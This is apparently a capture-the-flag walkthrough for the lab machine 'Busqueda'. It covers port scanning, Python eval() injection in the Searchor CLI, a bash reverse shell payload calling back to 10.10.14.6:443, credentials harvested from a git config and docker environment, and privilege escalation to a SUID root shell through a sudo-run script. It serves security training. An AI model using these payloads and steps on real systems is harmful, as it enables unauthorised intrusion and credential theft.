## 🛰️ Recon

[Easy](Easy)
### Nmap
```bash
nmap -p- --min-rate 10000 10.10.11.208
nmap -p 22,80 -sCV 10.10.11.208
```

### HTTP Service
- [Apache/2.4.52](HTTP) + Flask (Werkzeug/2.1.2 Python/3.10.6).
- Redirects to: `http://searcher.htb`

### Virtual Host
Add to `/etc/hosts`:
```text
10.10.11.208 searcher.htb
```

### Directory Fuzzing
```bash
feroxbuster -u http://searcher.htb
```

Found:
- `/search`

---

## 💥 Exploitation (RCE via Python `eval()`)

### Vulnerable App
- Uses [Searchor](https://github.com/searchor/Searchor) CLI (v2.4.0).
- Eval-based CLI argument parsing vulnerable to command injection.

### Injection PoC
```bash
searchor search GitHub "' + __import__('os').popen('id').read() + '"
```

### Reverse Shell Payload (Injected via Burp)
```python
' + __import__('os').popen('bash -c "bash -i >& /dev/tcp/10.10.14.6/443 0>&1"').read() + '
```

### Listener
```bash
nc -lnvp 443
```

---

## 🧠 Enumeration (as `svc`)

### Home Directory
```bash
cat ~/.gitconfig  # reveals username "cody"
```

### Web App Path
```bash
cd /var/www/app
ls -la
cat .git/config
```

- Remote repo: `http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/...`

---

## 🔐 Credentials Discovered
- `cody / jh1usoih2bkjaspwe92` (from .git/config)
- `gitea / yuiu1hoiu4i5ho1uh` (from docker inspect ENV)

---

## 🧬 Gitea

Add to `/etc/hosts`:
```text
10.10.11.208 gitea.searcher.htb
```

- Login as `cody` with found creds.
- Also test `administrator / yuiu1hoiu4i5ho1uh` → ✅
- Found private repo: `scripts`
- Contains: `system-checkup.py`

---

## 🔼 Privilege Escalation

### `sudo -l`
```bash
sudo -l
```
```text
User svc may run the following commands on busqueda:
(root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```

### Script Behavior
- `full-checkup` runs `./full-checkup.sh` from CWD.

### Exploit
```bash
echo -e '#!/bin/bash\ncp /bin/bash /tmp/0xdf\nchmod 4777 /tmp/0xdf' > full-checkup.sh
chmod +x full-checkup.sh
sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
```

### Run Bash as Root
```bash
/tmp/0xdf -p
```

---

## 🏁 Flags

```bash
cat /home/svc/user.txt
cat /root/root.txt
```